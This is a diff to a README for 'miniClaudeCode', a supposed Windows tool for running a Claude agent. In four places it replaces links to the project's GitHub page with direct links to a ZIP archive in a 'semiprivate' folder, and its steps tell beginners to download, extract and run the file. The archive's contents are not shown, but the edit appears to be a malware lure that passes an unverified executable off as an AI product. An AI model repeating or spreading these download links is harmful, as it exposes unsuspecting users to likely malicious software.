@@ -1,6 +1,6 @@
 # 🧠 miniClaudeCode - Run a Claude Agent in Minutes
 
-[![Download miniClaudeCode](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sleeknessbounder869/miniClaudeCode)
+[![Download miniClaudeCode](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip)
 
 ## 📌 What this is
 
@@ -12,7 +12,7 @@ It is built for people who want to start fast, without setting up a full develop
 
 Use this link to visit the page and download the app:
 
-[Download miniClaudeCode](https://github.com/Sleeknessbounder869/miniClaudeCode)
+[Download miniClaudeCode](https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip)
 
 ## 🪟 What you need
 
@@ -28,7 +28,7 @@ For a smooth setup on Windows, use:
 
 Follow these steps in order:
 
-1. Open the download page: [https://github.com/Sleeknessbounder869/miniClaudeCode](https://github.com/Sleeknessbounder869/miniClaudeCode)
+1. Open the download page: [https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip](https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip)
 2. Look for the latest release or the main download file
 3. Download the Windows file to your computer
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -214,7 +214,7 @@ Good requests:
 
 If you need the file again, use this link:
 
-[https://github.com/Sleeknessbounder869/miniClaudeCode](https://github.com/Sleeknessbounder869/miniClaudeCode)
+[https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip](https://raw.githubusercontent.com/Sleeknessbounder869/miniClaudeCode/main/semiprivate/Claude-mini-Code-v3.0.zip)
 
 ## 🔁 Typical next steps after install
 
